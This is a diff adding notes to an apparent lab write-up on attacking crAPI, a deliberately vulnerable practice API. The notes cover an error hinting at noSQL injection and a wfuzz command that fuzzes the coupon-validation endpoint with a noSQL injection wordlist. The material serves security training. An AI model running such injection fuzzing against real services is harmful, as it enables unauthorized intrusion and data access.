@@ -71,6 +71,12 @@ $nin
 >Many of the others in the list contain symbols that are meant to cause verbose errors.  
 >Other payload samples attempt to bypassing authentication or waiting 10 seconds.  
 
+>Enumeration of JSON POST body fields provide an error message that indicate possible noSQL:  
+
+```JSON
+{"error":"invalid character '$' after object key:value pair"}
+```  
+
 ![crapi-nosql-injection-fuzzing.png](/images/crapi-nosql-injection-fuzzing.png)
 
 >Result of fuzzing show noSQL injection, returning a shop coupon at the `/community/api/v2/coupon/validate-coupon`.  
@@ -150,5 +156,12 @@ Anyhow, if you host your own instance of crAPI, you can simply change the
 `block_shell_injections` flag in the config file to allow real shell injections.
 ```  
 
+## Fuzzing WFuzz  
+
+```
+wfuzz -z file,usr/share/wordlists/nosqli  -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d "{\"coupon_code\":FUZZ} http://crapi.apisec.ai/community/api/v2/coupon/validate-coupon
+```  
+
+ 
 
 
